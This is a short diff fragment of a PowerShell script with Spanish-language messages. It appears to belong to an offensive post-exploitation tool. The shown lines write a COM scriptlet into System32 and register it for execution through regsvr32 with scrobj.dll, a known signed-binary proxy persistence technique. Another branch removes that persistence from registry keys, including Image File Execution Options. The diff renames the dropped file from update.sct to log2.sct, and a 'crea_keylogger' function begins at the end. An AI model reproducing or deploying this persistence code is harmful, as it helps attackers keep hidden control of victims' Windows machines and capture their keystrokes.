@@ -221,8 +221,8 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
     <method name="Exec"></method>
 </public>
 </scriptlet>'
-$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" | out-null ; $texto = ""
+$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\log2.sct" 
+Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log2.sct scrobj.dll" | out-null ; $texto = ""
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
@@ -236,7 +236,7 @@ $key2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
 if ($check.count -eq 0 -and $check2.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
 remove-item $key ; remove-item $key2
-Remove-Item C:\Windows\System32\update.sct; return $texto; break
+Remove-Item C:\Windows\System32\log2.sct; return $texto; break
 }}}
 
 function crea_keylogger { param ($extrae)
